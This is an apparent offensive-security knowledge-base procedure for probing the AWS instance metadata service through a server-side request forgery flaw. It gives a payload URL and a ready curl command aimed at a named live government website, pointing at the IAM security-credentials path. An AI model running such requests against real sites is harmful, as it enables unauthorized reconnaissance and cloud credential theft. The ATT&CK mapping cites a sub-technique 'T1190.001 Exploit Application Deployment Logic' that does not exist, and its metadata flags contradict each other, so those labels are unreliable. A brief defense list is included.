---
id: proc-ssrf-aws-nonexistent
tags:
  - ssrf
  - aws
  - metadata
  - reconnaissance
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Fiddler]]'
  - '[[tools/ZAP]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/ssrf-aws-iam-credentialx-test]]'
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
updated_at: '2025-12-14T03:53:38.661Z'
sub_techniques:
  - '[[T1190.001]]'
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
---
# Test-AWS-Metadata-Non-Existent-Endpoint-via-SSRF

## Summary

This procedure tests a non-existent AWS metadata endpoint via SSRF to differentiate from existing paths, using error responses to map the service structure.

## Description

By targeting a invalid path like /security-credentialx, the SSRF returns a standard error, contrasting with empty bodies for valid paths. This refines reconnaissance of the AWS metadata API.

## Requirements

1. Confirmed SSRF access from prior steps
2. Proxy tool
3. List of potential metadata paths

## Defense

Defensive measures and detection strategies:

- Use IMDSv2 with tokens to secure metadata
- Log all internal requests and block suspicious paths
- Implement request signing for metadata access

## Objectives

1. Identify valid vs. invalid metadata endpoints
2. Enhance infrastructure mapping
3. Avoid false positives in reconnaissance

## Instructions

### Step 1: Craft Invalid Path Payload

**Context**: Use misspelled endpoint with %0A.

URL: http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0A...

### Step 2: Execute Test Request

**Context**: Send and analyze response.

**Command** ([[commands/ssrf-aws-iam-credentialx-test]]):
```bash
curl -X GET "https://search.usa.gov/help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html" -H "Host: search.usa.gov" -H "Cookie: [your_session_cookies]"
```

> Expect 200 OK with 'Unable to retrieve' error.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Active Scanning]] Active Scanning

### Sub-Techniques

- [[T1190.001]] Exploit Application Deployment Logic

## Commands Used

- [[commands/ssrf-aws-iam-credentialx-test]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Fiddler]]
- [[tools/ZAP]]

## Tags

- ssrf
- aws
- metadata
- reconnaissance
